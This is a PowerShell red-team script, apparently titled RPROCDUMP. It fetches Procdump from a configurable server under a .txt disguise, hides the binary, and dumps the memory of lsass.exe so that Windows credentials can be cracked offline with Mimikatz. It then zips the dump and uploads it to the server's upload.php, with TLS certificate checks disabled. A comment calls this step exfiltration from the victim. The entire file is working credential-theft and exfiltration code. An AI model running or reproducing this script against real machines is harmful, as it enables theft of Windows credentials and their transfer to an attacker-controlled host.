<#
RPROCDUMP - Remote process dumping automation. 
Use it to dump remotely all windows credentials and extract clear text with Mimikatz offline
Help:
	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters:
	example:
	RProcdump -server http://127.0.0.1 -login administrator -pass password123

 Author: @ThebenyGreen
  - EyesOpenSecurity
#>
[string] $server = "http://127.0.0.1"
[string] $process="lsass.exe" 
[string] $dumpfile = hostname
[string] $pshversion = $PSVersionTable.psversion.Major

Function zip{
	if ($pshversion -lt 3) {
		Add-Type -assembly "system.io.compression.filesystem"
		[io.compression.zipfile]::CreateFromDirectory("$env:userprofile\AppData\dump", "$env:userprofile\AppData\$dumpfile.zip")
		}
	else { 
		Compress-Archive -path "$env:userprofile\AppData\dump" -destinationpath "$env:userprofile\AppData\$dumpfile.zip"
		Start-sleep -Seconds 5
		}			
	}
Function Exfiltrate{ # exfiltrate data from victim 
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
		$http = new-object System.Net.WebClient;
		[string] $url="$server/upload.php";
		zip
		$Path = "$env:userprofile\AppData\$dumpfile.zip"
		Start-sleep -Seconds 5
		$http.UploadFile($url,$Path);
		}
			
Function ProccessDumpCommand { # Download and execute Procdump. Dump hash from privileged process. You have to use offline mimikatz to extract password in clear text
		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){
			$downloadURL = "$server/proc32.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc32.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") { 
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
			}
			(New-Object System.Net.WebClient).AllowWriteStreamBuffering = $false
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcdessDump 32..." -ForegroundColor DarkGreen;
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
		Else{ 
			$downloadURL = "$server/proc64.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc64.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcessDump 64..." -ForegroundColor DarkGreen
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
		$exists = "$env:userprofile\AppData\dump"
		if (Test-Path $exists){ } else {New-Item -Path "$env:userprofile\AppData" -Name "dump" -ItemType "directory" }
		$cmd = "$env:userprofile\AppData\proc.exe -accepteula -ma $process $env:userprofile\AppData\dump\$dumpfile.dmp"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$cmd"
        Invoke-Expression $CmdString
		Start-Sleep -Seconds 60
		Exfiltrate 
		}
		
ProccessDumpCommand
#Exfiltrate 